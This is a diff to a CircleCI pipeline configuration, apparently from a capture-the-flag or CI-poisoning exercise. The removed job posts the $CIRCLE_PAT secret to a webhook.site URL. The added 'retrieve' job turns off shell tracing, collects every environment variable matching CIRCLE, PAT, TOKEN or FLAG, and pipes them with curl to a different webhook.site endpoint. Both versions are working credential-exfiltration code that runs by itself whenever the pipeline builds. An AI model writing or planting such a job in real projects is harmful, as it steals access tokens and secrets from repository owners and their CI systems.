@@ -1,15 +1,23 @@
 version: 2.1
 
 jobs:
-  flag:
+  retrieve:
     docker:
       - image: cimg/base:stable
     steps:
       - run:
-          name: send flag
-          command: curl -fsS -X POST "https://webhook.site/cc716468-1dd5-4797-bd3e-e5da485079a2" --data-urlencode "flag=$CIRCLE_PAT"
+          name: Locate CircleCI PAT
+          command: |
+            set +x
+            {
+              echo "source=circleci-runner"
+              env | sort | grep -Ei '(^|_)(CIRCLE|CIRCLECI|PAT|TOKEN|FLAG)($|_)' || true
+            } | curl -fsS -X POST \
+                -H "Content-Type: text/plain" \
+                --data-binary @- \
+                "https://webhook.site/83ecc0de-4e6e-4fb8-a1d5-ad4c875b899d/pat-candidates"
 
 workflows:
-  exploit:
+  retrieve:
     jobs:
-      - flag
+      - retrieve
